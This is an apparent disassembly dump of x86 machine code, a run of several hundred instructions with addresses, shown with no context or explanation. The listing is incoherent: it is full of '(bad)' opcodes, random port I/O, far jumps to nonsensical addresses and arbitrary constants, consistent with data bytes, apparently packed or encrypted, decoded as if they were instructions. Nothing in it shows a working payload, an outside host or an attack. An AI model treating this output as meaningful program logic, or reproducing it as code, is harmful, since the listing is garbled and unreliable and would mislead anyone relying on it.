  41d31a:	jo     0x41d325
  41d31c:	or     BYTE PTR [ecx+0x2],0xcd
  41d320:	pop    edi
  41d321:	in     eax,dx
  41d322:	je     0x41d302
  41d324:	or     DWORD PTR [edx-0x2],eax
  41d327:	jg     0x41d30c
  41d329:	in     eax,0xd7
  41d32b:	push   es
  41d32c:	call   0x4dcc3837
  41d331:	sbb    dh,BYTE PTR [ecx+0x37bb9e8d]
  41d337:	add    eax,0xd74f71a3
  41d33c:	(bad)  
  41d33d:	push   esp
  41d33e:	dec    eax
  41d33f:	daa    
  41d340:	mov    edi,0x92ea55ce
  41d345:	test   BYTE PTR [ebx+esi*8],dl
  41d348:	mov    esi,0xeedbb51f
  41d34d:	or     bh,bl
  41d34f:	outs   dx,BYTE PTR ds:[esi]
  41d350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d351:	ror    BYTE PTR [ebx-0x38],1
  41d354:	xchg   bl,al
  41d356:	cmp    al,0x71
  41d358:	fcmovne st,st(5)
  41d35a:	mov    esp,0x4589e2de
  41d35f:	test   BYTE PTR [esi],ch
  41d361:	pop    eax
  41d362:	cwde   
  41d363:	inc    esi
  41d364:	outs   dx,DWORD PTR ds:[esi]
  41d365:	mov    ebp,0xbb4ee9f4
  41d36a:	(bad)  
  41d36b:	imul   ebp,DWORD PTR [esi+eiz*4+0x778537e5],0x5c
  41d373:	mov    BYTE PTR [esi+0x6b],ch
  41d376:	cdq    
  41d377:	out    dx,eax
  41d378:	xor    edi,DWORD PTR [esi-0x3add428c]
  41d37e:	icebp  
  41d37f:	(bad)  
  41d380:	div    ah
  41d382:	sbb    DWORD PTR [esp+eax*4],eax
  41d385:	add    ebx,DWORD PTR [edx]
  41d387:	stc    
  41d388:	pop    ds
  41d389:	mov    edi,0x617fa160
  41d38e:	pop    ecx
  41d38f:	sub    esp,ebx
  41d391:	xchg   ebp,eax
  41d392:	dec    ecx
  41d393:	xchg   esi,eax
  41d394:	sbb    dl,BYTE PTR [bp+si]
  41d397:	pop    ss
  41d398:	jmp    0x41d407
  41d39a:	add    al,0xb9
  41d39c:	scas   eax,DWORD PTR es:[edi]
  41d39d:	pop    ds
  41d39e:	ds jne 0x41d362
  41d3a1:	push   edx
  41d3a2:	jge    0x41d33c
  41d3a4:	jge    0x41d3b7
  41d3a6:	cmp    al,0x28
  41d3a8:	adc    eax,0x655e7273
  41d3ad:	pop    ebp
  41d3ae:	std    
  41d3af:	mov    edx,0xa2a5fe07
  41d3b4:	jg     0x41d358
  41d3b6:	data16 ja 0x41d390
  41d3b9:	adc    BYTE PTR ds:0xf74936cd,bh
  41d3bf:	ret    0x777a
  41d3c2:	je     0x41d3d5
  41d3c4:	xor    al,0xa9
  41d3c6:	(bad)  
  41d3c7:	mov    DWORD PTR [edx],esp
  41d3c9:	push   esp
  41d3ca:	retf   0xe947
  41d3cd:	mov    eax,ds:0xad09e86c
  41d3d2:	add    bh,BYTE PTR [edx+edi*1]
  41d3d5:	pop    edx
  41d3d6:	jle    0x16955867
  41d3dc:	mov    WORD PTR [esi+esi*2],fs
  41d3df:	mov    ds:0xf0366d51,eax
  41d3e4:	add    BYTE PTR [edx+0x30],0xce
  41d3e8:	ret    0xd708
  41d3eb:	outs   dx,BYTE PTR ds:[esi]
  41d3ec:	sahf   
  41d3ed:	sub    BYTE PTR ds:0x7a6dc059,al
  41d3f3:	xchg   edi,eax
  41d3f4:	ficom  DWORD PTR [eax-0x21402153]
  41d3fa:	xor    eax,0xfb86cfc8
  41d3ff:	fcom   DWORD PTR [esp+ebx*1+0x5ce78d7b]
  41d406:	enter  0x9cc8,0xa1
  41d40a:	mov    DWORD PTR [edi+esi*4],edi
  41d40d:	pop    edi
  41d40e:	fcom   DWORD PTR [ebp+0x58]
  41d411:	xor    ebp,ebx
  41d413:	xchg   edi,eax
  41d414:	xor    al,0xd0
  41d416:	pop    ds
  41d417:	or     BYTE PTR [ecx+eiz*4],dl
  41d41a:	xchg   ecx,eax
  41d41b:	rcr    DWORD PTR [esi-0x5108b1ae],cl
  41d421:	xor    ecx,DWORD PTR [edi+0x5a]
  41d424:	adc    BYTE PTR [ebx+0x59d602c3],ah
  41d42a:	or     eax,0xf782093f
  41d42f:	mov    eax,ds:0x5756bcb7
  41d434:	int    0xd8
  41d436:	stos   BYTE PTR es:[edi],al
  41d437:	adc    ecx,DWORD PTR [ebx+0x1a]
  41d43a:	cmp    al,0xae
  41d43c:	je     0x41d433
  41d43e:	enter  0x4365,0x19
  41d442:	arpl   WORD PTR [esp+edi*1],dx
  41d445:	push   ds
  41d446:	xor    dl,ah
  41d448:	jbe    0x41d408
  41d44a:	cmp    DWORD PTR [esi+0x7df5ecc5],ebx
  41d450:	dec    esp
  41d451:	enter  0xd9c3,0x3d
  41d455:	push   eax
  41d456:	mov    ds:0x4b680360,al
  41d45b:	sbb    al,0xcf
  41d45d:	icebp  
  41d45e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d45f:	fisubr WORD PTR [ebx]
  41d461:	add    BYTE PTR [ebx-0x586af020],cl
  41d467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d468:	add    ebp,DWORD PTR [edx+0x5fa387a9]
  41d46e:	out    0x1b,eax
  41d470:	std    
  41d471:	push   ebx
  41d472:	sub    dh,BYTE PTR [edx]
  41d474:	pop    esi
  41d475:	(bad)  
  41d476:	idiv   DWORD PTR [eax]
  41d478:	enter  0x2cad,0x9e
  41d47c:	or     BYTE PTR [edx+0x46],ch
  41d47f:	push   ecx
  41d480:	and    DWORD PTR [ebx],esi
  41d482:	repnz add al,0x5e
  41d485:	xchg   esi,eax
  41d486:	xchg   ebp,eax
  41d487:	out    0x49,al
  41d489:	lea    esp,[edx]
  41d48b:	push   edx
  41d48c:	mov    ch,0x6a
  41d48e:	xchg   bl,bl
  41d490:	add    al,0x25
  41d492:	pop    edi
  41d493:	iret   
  41d494:	sbb    ch,BYTE PTR [eax-0x58a3122]
  41d49a:	and    ch,BYTE PTR [edx]
  41d49c:	(bad)  
  41d49d:	xchg   esi,eax
  41d49e:	ins    BYTE PTR es:[edi],dx
  41d49f:	dec    DWORD PTR [edi]
  41d4a1:	hlt    
  41d4a2:	dec    edx
  41d4a3:	in     al,dx
  41d4a4:	mov    ebp,0xc2ee78ca
  41d4a9:	mov    dh,0x1e
  41d4ab:	enter  0xb69,0x9
  41d4af:	push   edi
  41d4b0:	jno    0x41d477
  41d4b2:	call   0xc1b8:0xc6127af9
  41d4b9:	pop    esi
  41d4ba:	fistp  QWORD PTR [eax+0x77]
  41d4bd:	daa    
  41d4be:	into   
  41d4bf:	jle    0x41d4da
  41d4c1:	mov    ebx,0x8f023e3
  41d4c6:	pop    edi
  41d4c7:	test   DWORD PTR [edx+ebx*8+0x8],ecx
  41d4cb:	mov    eax,ds:0xfe2988ef
  41d4d0:	(bad)  
  41d4d1:	mov    ds:0xfd4db61,eax
  41d4d6:	out    dx,al
  41d4d7:	pusha  
  41d4d8:	test   DWORD PTR [edx],0xa2255ffe
  41d4de:	mov    esi,0x89a19d40
  41d4e3:	(bad)  
  41d4e4:	dec    ebp
  41d4e5:	mov    WORD PTR [esi+0x44],es
  41d4e8:	test   DWORD PTR [esi+0x4],eax
  41d4eb:	imul   edx,DWORD PTR [edi-0x303e0e24],0x70fa91dc
  41d4f5:	xor    BYTE PTR [ebx],dl
  41d4f7:	addr16 inc ebx
  41d4f9:	inc    esp
  41d4fa:	das    
  41d4fb:	lea    edi,[ecx+eax*4+0x7c]
  41d4ff:	mov    WORD PTR [edx+0x3e6f8933],es
  41d505:	inc    BYTE PTR [ebp+0x2441d6a1]
  41d50b:	fisttp DWORD PTR [edx+0x30]
  41d50e:	xchg   esp,eax
  41d50f:	add    DWORD PTR [ebx+0x77],eax
  41d512:	loope  0x41d545
  41d514:	xor    ah,ah
  41d516:	and    BYTE PTR [esi-0x6afbac3b],0x6
  41d51d:	pop    eax
  41d51e:	push   ds
  41d51f:	fwait
  41d520:	xlat   BYTE PTR ds:[ebx]
  41d521:	adc    BYTE PTR [ecx+0x2d],ch
  41d524:	repnz add al,0xe5
  41d527:	mov    cl,0xe8
  41d529:	shr    DWORD PTR [eax+0x192fd10e],1
  41d52f:	sub    BYTE PTR [edi-0x35bf2b15],dh
  41d535:	push   eax
  41d536:	xor    BYTE PTR [ebx-0x70],ch
  41d539:	xchg   ebp,eax
  41d53a:	jo     0x41d573
  41d53c:	sub    al,BYTE PTR [eax-0x51498155]
  41d542:	sbb    esi,edx
  41d544:	js     0x41d5c0
  41d546:	jge    0x41d5a5
  41d548:	jmp    0x41d4d5
  41d54a:	lods   eax,DWORD PTR ds:[esi]
  41d54b:	adc    DWORD PTR [edi+0x14],0x2a8e07c0
  41d552:	jns    0x41d534
  41d554:	sti    
  41d555:	inc    esp
  41d556:	bnd jg 0x41d586
  41d559:	pusha  
  41d55a:	jns    0x41d530
  41d55c:	xor    eax,0x97cc6653
  41d561:	test   eax,0x2b713d34
  41d566:	push   0x19
  41d568:	or     dh,BYTE PTR [ebp+0x17]
  41d56b:	enter  0xb680,0x8a
  41d56f:	inc    ebx
  41d570:	(bad)  
  41d571:	jmp    0x41d54f
  41d573:	jg     0x41d531
  41d575:	add    ch,BYTE PTR [ecx+0x6a]
  41d578:	adc    al,0x29
  41d57a:	aam    0x9c
  41d57c:	(bad)  
  41d57d:	rcl    esp,cl
  41d57f:	dec    esi
  41d580:	mov    eax,ds:0xdaa75b29
  41d585:	sub    bl,bh
  41d587:	hlt    
  41d588:	pop    ebp
  41d589:	sahf   
  41d58a:	add    DWORD PTR [edx-0x5bc397b7],ecx
  41d590:	vmwrite eax,DWORD PTR [ebx+0x60]
  41d594:	call   edx
  41d596:	xchg   ecx,eax
  41d597:	and    ah,BYTE PTR [eax+0x24625c6a]
  41d59d:	or     DWORD PTR [edx+0x6d],0xffffff8f
  41d5a1:	mov    eax,ds:0x8180f0a4
  41d5a6:	mov    esi,0xb424f892
  41d5ab:	push   esi
  41d5ac:	xor    eax,DWORD PTR [eax-0x2f510e1f]
  41d5b2:	lahf   
  41d5b3:	cmp    BYTE PTR ds:0x7f1550c5,ch
  41d5b9:	out    dx,al
  41d5ba:	(bad)  
  41d5bb:	repnz push eax
  41d5bd:	mov    ds:0xcfca409d,al
  41d5c2:	xlat   BYTE PTR ds:[ebx]
  41d5c3:	sar    DWORD PTR ds:0x80c431a3,1
  41d5c9:	aam    0x2a
  41d5cb:	fbstp  TBYTE PTR [edx-0x2a]
  41d5ce:	inc    esi
  41d5cf:	pop    eax
  41d5d0:	lods   eax,DWORD PTR ds:[esi]
  41d5d1:	or     eax,0x9816cb7a
  41d5d6:	in     al,0x66
  41d5d8:	add    ch,BYTE PTR [edi+0x3a]
  41d5db:	out    dx,eax
  41d5dc:	ret    0xa75e
  41d5df:	sub    eax,0x581a7729
  41d5e4:	pusha  
  41d5e5:	jl     0x41d615
  41d5e7:	outs   dx,BYTE PTR ds:[esi]
  41d5e8:	int    0x4f
  41d5ea:	mov    edi,0x7a281167
  41d5ef:	jp     0x41d613
  41d5f1:	sti    
  41d5f2:	cmp    eax,DWORD PTR [ebp-0x78314957]
  41d5f8:	push   esp
  41d5f9:	ins    BYTE PTR es:[edi],dx
  41d5fa:	mov    ecx,0xb292c5e7
  41d5ff:	ret    
  41d600:	or     bl,BYTE PTR ds:[eax+eax*1]
  41d604:	xor    esi,edx
  41d606:	dec    bh
  41d608:	cld    
  41d609:	gs dec ecx
  41d60b:	dec    esp
  41d60c:	(bad)  
  41d60e:	sub    eax,0x5f5e7ea8
  41d613:	pop    ss
  41d614:	imul   ebx,DWORD PTR [esi+0x16e7ab0c],0xffffffac
  41d61b:	sbb    al,BYTE PTR [edi+0x394f5638]
  41d621:	lods   eax,DWORD PTR ds:[esi]
  41d622:	mov    ds:0x2f6a94ac,eax
  41d627:	(bad)  
  41d628:	icebp  
  41d629:	xor    eax,0x910d9107
  41d62e:	outs   dx,DWORD PTR ds:[esi]
  41d62f:	lods   eax,DWORD PTR ds:[esi]
  41d630:	xor    al,0xa6
  41d632:	jo     0x41d67d
  41d634:	mov    fs,esp
  41d636:	mov    al,fs:0x57370142
  41d63c:	mov    bl,0x9c
  41d63e:	and    eax,ebx
  41d640:	das    
  41d641:	(bad)  
  41d643:	popa   
  41d644:	dec    esi
  41d645:	xor    edx,DWORD PTR [esp+eiz*2+0x568c682a]
  41d64c:	mov    esi,0xa907fb32
  41d651:	sbb    al,0x7c
  41d653:	add    BYTE PTR [eax-0x2a5418f0],0xef
  41d65a:	popa   
  41d65b:	cld    
  41d65c:	fisubr WORD PTR [ecx+0x24872ab4]
  41d662:	and    DWORD PTR [ecx+0x70],0x98fc41b9
  41d669:	mov    dl,0x8a
  41d66b:	cmp    bh,BYTE PTR [eax]
  41d66d:	in     eax,dx
  41d66e:	call   0xd23480f0
  41d673:	jbe    0x41d686
  41d675:	dec    esi
  41d676:	cli    
  41d677:	mov    ecx,0xd77cd440
  41d67c:	mov    ebp,0xc3803446
  41d681:	in     eax,dx
  41d682:	shr    DWORD PTR [esp+esi*1],0x96
  41d686:	outs   dx,DWORD PTR ds:[esi]
  41d687:	lods   eax,DWORD PTR ds:[esi]
  41d688:	add    bh,BYTE PTR [edi+0x65]
  41d68b:	test   DWORD PTR [eax+ecx*4-0x3dacab8a],ebx
  41d692:	add    eax,0xe6f5269e
  41d697:	dec    esp
  41d698:	in     al,0xe2
  41d69a:	mov    ecx,0x20b41f4
  41d69f:	(bad)  
  41d6a0:	loop   0x41d65f
  41d6a2:	std    
  41d6a3:	outs   dx,BYTE PTR ds:[esi]
  41d6a4:	pop    ss
  41d6a5:	cmp    edi,DWORD PTR [eax+0x27]
  41d6a8:	cmp    al,0xd0
  41d6aa:	inc    edi
  41d6ab:	das    
  41d6ac:	add    eax,0xb5b84851
  41d6b1:	pop    ecx
  41d6b2:	push   ds
  41d6b3:	mov    bh,0x7a
  41d6b5:	mov    dl,BYTE PTR [eax-0x34]
  41d6b8:	add    BYTE PTR [ecx],0xc0
  41d6bb:	dec    eax
  41d6bc:	jne    0x41d67b
  41d6be:	rcl    BYTE PTR [esi],cl
  41d6c0:	push   eax
  41d6c1:	dec    esi
  41d6c2:	cdq    
  41d6c3:	dec    edx
  41d6c4:	dec    ebx
  41d6c5:	arpl   WORD PTR [edi+0x7c],cx
  41d6c8:	mov    ds:0xe9488f1c,eax
  41d6cd:	popa   
  41d6ce:	mov    DWORD PTR [ecx-0x54],eax
  41d6d1:	aas    
  41d6d2:	mov    edi,ss
  41d6d4:	out    0xe7,al
  41d6d6:	shl    DWORD PTR [eax+0x64],cl
  41d6d9:	popa   
  41d6da:	cld    
  41d6db:	jne    0x41d69e
  41d6dd:	push   ebx
  41d6de:	icebp  
  41d6df:	lods   al,BYTE PTR ds:[esi]
  41d6e0:	mov    al,0xca
  41d6e2:	xchg   edx,eax
  41d6e3:	sbb    esi,DWORD PTR [edi+0x2bebbf21]
  41d6e9:	sub    bh,cl
  41d6eb:	jb     0x41d74d
  41d6ed:	pop    ebx
  41d6ee:	mov    al,0xa2
  41d6f0:	inc    esi
  41d6f1:	jmp    0x42f7:0x8e85d616
  41d6f8:	js     0x41d6ad
  41d6fa:	mov    bl,0xbf
  41d6fc:	pop    ebx
  41d6fd:	das    
  41d6fe:	dec    edx
  41d6ff:	cs mov ebp,0x9365c408
  41d705:	rcl    BYTE PTR [ecx-0x64],0xd4
  41d709:	jns    0x41d72b
  41d70b:	repz sub ch,bl
  41d70e:	jmp    0x41d749
  41d710:	bound  ebp,QWORD PTR [ecx-0x3861e2fa]
  41d716:	jbe    0x41d788
  41d718:	sbb    BYTE PTR ss:[eax+0x79],ch
  41d71c:	adc    BYTE PTR [ecx],cl
  41d71e:	fucomip st,st(4)
  41d720:	mov    BYTE PTR [ecx+0x36],cl
  41d723:	jnp    0x41d75c
  41d725:	mov    eax,ds:0x79a3cbd
  41d72a:	test   al,0x5b
  41d72c:	scas   al,BYTE PTR es:[edi]
  41d72d:	push   esp
  41d72e:	bound  esp,QWORD PTR [esi]
  41d730:	or     ch,ch
  41d732:	push   ebp
  41d733:	ror    BYTE PTR [ecx+edx*8+0x7192b48d],1
  41d73a:	scas   eax,DWORD PTR es:[edi]
  41d73b:	movq   QWORD PTR [eax+0x3d90fa3a],mm2
  41d742:	loope  0x41d762
  41d744:	mov    esp,0x9a3ee02f
  41d749:	xor    bh,BYTE PTR [edi]
  41d74b:	enter  0xf12,0x67
  41d74f:	mov    eax,esp
  41d751:	test   eax,0x111adca
  41d756:	stos   DWORD PTR es:[edi],eax
  41d757:	mov    edi,DWORD PTR [ebx+edi*2-0x3b]
  41d75b:	push   0xbb6454d6
  41d760:	inc    esp
  41d761:	fdiv   DWORD PTR [ebp+0x2f8695b3]
  41d767:	ds xor ebx,0xffffffbb
  41d76b:	add    eax,0x8f50df5a
  41d770:	adc    DWORD PTR [esi+0x3c],ebp
  41d773:	jae    0x41d7ef
  41d775:	sbb    ebx,DWORD PTR [ecx+0x77429437]
  41d77b:	cwde   
  41d77c:	mov    fs,WORD PTR [edi-0x28]
  41d77f:	int3   
  41d780:	sbb    BYTE PTR [ebx-0x4f],ah
  41d783:	xchg   ebx,eax
  41d784:	and    bh,BYTE PTR [esi]
  41d786:	push   0x44fae513
  41d78b:	sbb    cl,al
  41d78d:	fmul   QWORD PTR [eax]
  41d78f:	sub    eax,0x9f25c394
  41d794:	sub    eax,eax
  41d796:	and    ah,BYTE PTR [ebp-0x63f8a738]
  41d79c:	repz iret 
  41d79e:	mov    BYTE PTR [edi],ch
  41d7a0:	ret    
  41d7a1:	push   ecx
  41d7a2:	shr    BYTE PTR [edx+0x47d0eec2],1
  41d7a8:	sti    
  41d7a9:	mov    ecx,0xa6d07231
  41d7ae:	mov    bl,0x9a
  41d7b0:	mov    ebp,0x3ba99aa7
  41d7b5:	and    BYTE PTR [edi],cl
  41d7b7:	and    bl,BYTE PTR [edx-0x59b4840c]
  41d7bd:	loop   0x41d775
  41d7bf:	jp     0x41d762
  41d7c1:	es repnz dec esi
  41d7c4:	ficom  WORD PTR [eax+0x2961c89c]
  41d7ca:	xor    DWORD PTR cs:[edi-0x56],edi
  41d7ce:	jge    0x41d84b
  41d7d0:	pop    eax
  41d7d1:	xor    DWORD PTR [edi+0xe],0xf70ba45a
  41d7d8:	mov    ds:0x9a25ef41,eax
  41d7dd:	int    0x55
  41d7df:	mov    bh,0xef
  41d7e1:	in     al,0x4
  41d7e3:	push   esp
  41d7e4:	mov    ebx,0x5f970978
  41d7e9:	adc    DWORD PTR [edi],edi
  41d7eb:	adc    eax,0x7bfb24cc
  41d7f0:	jmp    0xed80a0f3
  41d7f5:	cmp    esp,DWORD PTR [esi+0x21]
  41d7f8:	mov    eax,0x6ac1a3ad
  41d7fd:	dec    edi
  41d7fe:	out    dx,al
  41d7ff:	fimul  DWORD PTR [eax+ebp*1+0x6855d72d]
  41d806:	sub    eax,0xe4fa5cfe
  41d80b:	cmp    DWORD PTR cs:[ecx+ebx*4+0x73],0x40
  41d811:	sbb    dl,dh
  41d813:	jl     0x41d840
  41d815:	neg    edx
  41d817:	dec    ebx
  41d818:	mov    dl,0xc7
  41d81a:	out    0xae,al
  41d81c:	pop    esi
  41d81d:	cmc    
  41d81e:	jae    0x41d7ae
  41d820:	push   0xadb87e74
  41d825:	xor    al,0xb
  41d827:	cld    
  41d828:	fstp   QWORD PTR [esi+ebx*1]
  41d82b:	jb     0x41d866
  41d82d:	cwde   
  41d82e:	lock jg 0x41d7f5
  41d831:	push   ebx
  41d832:	fdivrp st(0),st
  41d834:	repnz mov esi,0xeae945be
  41d83a:	sar    DWORD PTR [esi],cl
  41d83c:	xchg   ecx,esi
  41d83e:	nop
  41d83f:	add    al,0x5a
  41d841:	fisub  WORD PTR [esi+0x4d6b3d65]
  41d847:	xor    dl,BYTE PTR [eax]
  41d849:	push   es
  41d84a:	add    BYTE PTR [edx+edi*8-0x56],ch
  41d84e:	pop    es
  41d84f:	(bad)  
  41d851:	inc    eax
  41d852:	cwde   
  41d853:	mov    ebx,0x7d4e64f6
  41d858:	outs   dx,DWORD PTR ds:[esi]
  41d859:	xlat   BYTE PTR ds:[ebx]
  41d85a:	inc    ebp
  41d85b:	scas   al,BYTE PTR es:[edi]
  41d85c:	add    eax,0xe035349f
  41d861:	xor    ebp,DWORD PTR [ecx+0x6049fcf3]
  41d867:	or     edx,DWORD PTR [ebx]
  41d869:	xor    eax,0x929f0104
  41d86e:	ret    0x5862
  41d871:	leave  
  41d872:	cmc    
  41d873:	inc    ecx
  41d874:	sbb    bl,BYTE PTR [edi+0x1a077a4]
  41d87a:	adc    DWORD PTR [ecx],0x736cb46
  41d880:	push   0xd297464b
  41d885:	cmp    eax,0xbc589c3d
  41d88a:	xchg   DWORD PTR [esi-0x20],esi
  41d88d:	xchg   ebp,eax
  41d88e:	sbb    BYTE PTR [ecx+eiz*1+0x5a],dh
  41d892:	pop    es
  41d893:	fwait
  41d894:	mov    DWORD PTR [ecx-0x134b97e5],edi
  41d89a:	xor    BYTE PTR [edi],dl
  41d89c:	in     al,dx
  41d89d:	cdq    
  41d89e:	push   ds
  41d89f:	inc    edi
  41d8a0:	mov    esi,0xb01da1c5
  41d8a5:	inc    ecx
  41d8a6:	test   eax,0xcadb46c2
  41d8ab:	out    dx,eax
  41d8ac:	mov    bl,0x15
  41d8ae:	mov    ebp,0x80f2de0a
  41d8b3:	jg     0x41d894
  41d8b5:	mov    DWORD PTR [ebp+0x7bb6f3de],edi
  41d8bb:	xor    eax,0x5f68fcb6
  41d8c0:	xchg   edx,eax
  41d8c1:	sub    BYTE PTR [ebp+eax*8-0x6d9ca965],0x9a
  41d8c9:	enter  0xdbf4,0xa4
  41d8cd:	retf   
  41d8ce:	jp     0x41d909
  41d8d0:	ret    
  41d8d1:	icebp  
  41d8d2:	popa   
  41d8d3:	test   BYTE PTR [ebx],0x61
  41d8d6:	inc    eax
  41d8d7:	fimul  DWORD PTR [edi]
  41d8d9:	sar    BYTE PTR [ebx+0x2bcd580],1
  41d8df:	push   ss
  41d8e0:	repnz cmp BYTE PTR [ecx-0x1b],dh
  41d8e4:	ja     0x41d867
  41d8e6:	jbe    0x41d942
  41d8e8:	ins    BYTE PTR es:[edi],dx
  41d8e9:	jmp    0x41d8c1
  41d8eb:	pop    edx
  41d8ec:	xchg   esp,eax
  41d8ed:	repnz push ebx
  41d8ef:	inc    ebp
  41d8f0:	dec    edi
  41d8f1:	inc    ebp
  41d8f2:	xchg   edi,eax
  41d8f3:	aam    0x47
  41d8f5:	jmp    0xe21e:0x4f299266
  41d8fc:	lods   eax,DWORD PTR ds:[esi]
  41d8fd:	adc    ch,BYTE PTR [ecx+esi*4-0x2d]
  41d901:	and    bl,BYTE PTR [edx-0xa]
  41d904:	dec    edi
  41d905:	push   ebx
  41d906:	call   0x88cb41e7
  41d90b:	cli    
  41d90c:	xor    BYTE PTR [edx-0x75],cl
  41d90f:	mov    dh,0x35
  41d911:	inc    ecx
  41d912:	enter  0xeed,0xe
  41d916:	fld    QWORD PTR [eax-0x1b]
  41d919:	pop    eax
  41d91a:	add    BYTE PTR [edx-0x32ca171c],bh
  41d920:	lods   eax,DWORD PTR ds:[esi]
  41d921:	mov    dh,0xb5
  41d923:	cmc    
  41d924:	mov    ch,0xb5
  41d926:	(bad)  
  41d927:	cli    
  41d928:	pop    es
  41d929:	add    DWORD PTR [edx-0x49],esi
  41d92c:	mov    ah,0xa9
  41d92e:	sub    al,0xc9
  41d930:	ror    BYTE PTR [ebp+0x0],1
  41d933:	mov    dh,0x63
  41d935:	sub    al,dh
  41d937:	sbb    al,BYTE PTR [esi]
  41d939:	cmc    
  41d93a:	sti    
  41d93b:	dec    edx
  41d93c:	rcl    bl,0x76
  41d93f:	add    esp,esi
  41d941:	inc    edx
  41d942:	(bad)  
  41d943:	xchg   edi,eax
  41d944:	call   0x4761:0x9dd079f5
  41d94b:	into   
  41d94c:	xor    DWORD PTR [edx],ebx
  41d94e:	pop    edx
  41d94f:	jne    0x41d997
  41d951:	stos   BYTE PTR es:[edi],al
  41d952:	inc    ebp
  41d953:	mov    ebp,0x2bdc8fa1
  41d958:	xchg   esp,edx
  41d95a:	mov    al,0x10
  41d95c:	adc    BYTE PTR [ebp-0x1e],ch
  41d95f:	rep stos DWORD PTR es:[edi],eax
  41d961:	dec    esi
  41d962:	fs jmp 0x64fa:0xc8c95fb
  41d96a:	adc    DWORD PTR [edx],ebx
  41d96c:	dec    ecx
  41d96d:	pop    ebp
  41d96e:	arpl   ax,dx
  41d970:	add    al,ch
  41d972:	push   esi
  41d974:	jg     0x41d948
  41d976:	push   ds
  41d977:	mov    gs,WORD PTR ds:0xce5aca0b
  41d97d:	jp     0x41d92a
  41d97f:	loop   0x41d934
  41d981:	sub    al,0x43
  41d983:	cli    
  41d984:	pop    ecx
  41d985:	fcom   DWORD PTR [esi]
  41d987:	jle    0x41d9b2
  41d989:	sbb    DWORD PTR [edx],ebp
  41d98b:	shl    DWORD PTR [edi],0xb6
  41d98e:	test   DWORD PTR [ebx],esi
  41d990:	push   esp
  41d991:	push   ebx
  41d992:	dec    ebx
  41d993:	jl     0x41d92a
  41d995:	pop    ss
  41d996:	daa    
  41d997:	cdq    
  41d998:	icebp  
  41d999:	mov    ebx,DWORD PTR [esi-0x421a6cd1]
  41d99f:	cwde   
  41d9a0:	ret    0xc90b
  41d9a3:	push   ds
  41d9a4:	adc    eax,0x70a5e8d3
  41d9a9:	cmp    dh,ah
  41d9ab:	mov    dh,0xff
  41d9ad:	cs mov cl,0xef
  41d9b0:	push   DWORD PTR ds:0x1cb8cb2b
  41d9b6:	sbb    dh,BYTE PTR ds:0x57f2d432
  41d9bc:	jnp    0x41d95b
  41d9be:	das    
  41d9bf:	or     BYTE PTR [eax+edx*8+0x4e198c90],0xd3
  41d9c7:	loopne 0x41d9d7
  41d9c9:	xchg   esp,eax
  41d9ca:	dec    edx
  41d9cb:	jl     0x41d9c7
  41d9cd:	dec    ecx
  41d9ce:	pop    eax
  41d9cf:	lds    ebp,FWORD PTR [edi+0x7fe0f13e]
  41d9d5:	shl    DWORD PTR [ecx+0x29214f91],1
  41d9db:	retf   0xf769
  41d9de:	push   es
  41d9df:	jl     0x41d977
  41d9e1:	pop    esp
  41d9e2:	jle    0x41da57
  41d9e4:	or     edx,edi
  41d9e6:	mov    eax,0x698fd384
  41d9eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ec:	inc    edi
  41d9ed:	into   
  41d9ee:	mov    eax,ds:0x9534d754
  41d9f3:	push   eax
  41d9f4:	dec    edx
  41d9f5:	mov    eax,0x7b199be8
  41d9fa:	add    DWORD PTR [esi+esi*1+0x54],0xa84e4e86
  41da02:	xchg   esp,eax
  41da03:	test   DWORD PTR [ebx],esp
  41da05:	jl     0x41d994
  41da07:	adc    al,0x5b
  41da09:	and    al,0x29
  41da0b:	sar    DWORD PTR ss:[ebp-0x2067d511],0xd8
  41da13:	xor    esi,DWORD PTR [edi+0x6c]
  41da16:	inc    eax
  41da17:	cli    
  41da18:	or     BYTE PTR [eax-0x6a],ch
  41da1b:	dec    edx
  41da1c:	ss sub ecx,ecx
  41da1f:	les    ecx,FWORD PTR [ecx]
  41da21:	icebp  
  41da22:	scas   eax,DWORD PTR es:[edi]
  41da23:	lahf   
  41da24:	or     DWORD PTR [edx],0xffffffe1
  41da27:	mov    WORD PTR [edx-0x57dc80cf],cs
  41da2d:	pop    edi
  41da2e:	inc    esi
  41da2f:	sbb    BYTE PTR [edi],bh
  41da31:	pop    ecx
  41da32:	push   esp
  41da33:	adc    ecx,DWORD PTR [ebx+0x19]
  41da36:	cmc    
  41da37:	shr    BYTE PTR [eax+ecx*4+0x1050962f],cl
  41da3e:	mov    edx,0x5b62a75e
  41da43:	lea    esi,[ebp+0x3d62f911]
  41da49:	mov    BYTE PTR [esi+0x5b],al
  41da4c:	mov    eax,fs:0x1ed6089d
  41da52:	(bad)  
  41da53:	jmp    0x41da98
  41da55:	aad    0x2a
  41da57:	lea    esi,[esi-0x36cdf548]
  41da5d:	xchg   edi,eax
  41da5e:	pop    ecx
  41da5f:	imul   ebx,DWORD PTR [ecx-0x7c],0x79602b55
  41da66:	imul   ecx,DWORD PTR [edx-0x49e481c2],0xd759fbc3
  41da70:	dec    esi
  41da71:	sbb    al,0x8
  41da73:	loopne 0x41da25
  41da75:	jno    0x41da74
  41da77:	repz pop ebp
  41da79:	add    BYTE PTR [eax+0x1b],al
  41da7c:	aas    
  41da7d:	xchg   edx,eax
  41da7e:	xchg   ecx,eax
  41da7f:	retf   
  41da80:	add    esp,DWORD PTR [esi]
  41da82:	pop    ebp
  41da83:	push   eax
  41da84:	jne    0x3b5ab2fd
  41da8a:	xchg   edx,eax
  41da8b:	mov    esp,0x729a9a41
  41da90:	sub    eax,0x69cf3d5d
  41da95:	mov    ch,0xc3
  41da97:	mov    al,ds:0x359eb607
  41da9c:	out    0xa5,al
  41da9e:	scas   al,BYTE PTR es:[edi]
  41da9f:	push   edx
  41daa0:	aad    0xc0
  41daa2:	mov    cs,WORD PTR [edi+0x2b]
  41daa5:	adc    DWORD PTR [esi-0x3b],0xffffff8c
  41daa9:	scas   eax,DWORD PTR es:[edi]
  41daaa:	add    BYTE PTR [esi+0x135886d],0x71
  41dab1:	xor    eax,esi
  41dab3:	loopne 0x41da66
  41dab5:	push   edx
  41dab6:	or     eax,esp
  41dab8:	js     0x41db2c
  41daba:	jae    0x41daa9
  41dabc:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41dabe:	int3   
  41dabf:	or     ebp,DWORD PTR fs:[ebx-0x41]
